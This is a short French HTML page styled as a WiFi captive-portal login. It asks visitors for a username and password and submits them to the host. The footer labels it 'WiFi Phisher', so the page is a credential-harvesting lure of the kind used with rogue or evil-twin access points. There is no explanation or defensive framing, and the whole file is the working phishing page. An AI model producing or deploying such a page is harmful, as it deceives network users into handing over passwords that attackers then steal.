<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Connexion WiFi - ENAMA EYENOAH</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #2ecc71, #27ae60);
    color: #fff;
    text-align: center;
    padding: 40px 20px;
  }
  h1 {
    font-size: 2.5em;
    margin-bottom: 0.2em;
  }
  p {
    margin-bottom: 2em;
    font-size: 1.2em;
  }
  form {
    background: rgba(255, 255, 255, 0.1);
    padding: 30px;
    border-radius: 10px;
    max-width: 400px;
    margin: 0 auto;
  }
  input[type="text"], input[type="password"] {
    width: 90%;
    padding: 12px;
    margin: 10px 0 20px 0;
    border: none;
    border-radius: 5px;
    font-size: 1em;
  }
  button {
    background-color: #27ae60;
    border: none;
    padding: 15px 25px;
    color: white;
    font-size: 1.1em;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #2ecc71;
  }
  footer {
    margin-top: 3em;
    font-size: 0.8em;
    opacity: 0.7;
  }
</style>
</head>
<body>
  <h1>Connexion WiFi</h1>
  <p>Veuillez entrer vos identifiants pour accéder au réseau WiFi</p>
  <form method="POST" action="/">
    <input type="text" name="username" placeholder="Nom d'utilisateur" required />
    <input type="password" name="password" placeholder="Mot de passe" required />
    <button type="submit">Se connecter</button>
  </form>
  <footer>© ENAMA EYENOAH - WiFi Phisher</footer>
</body>
</html>
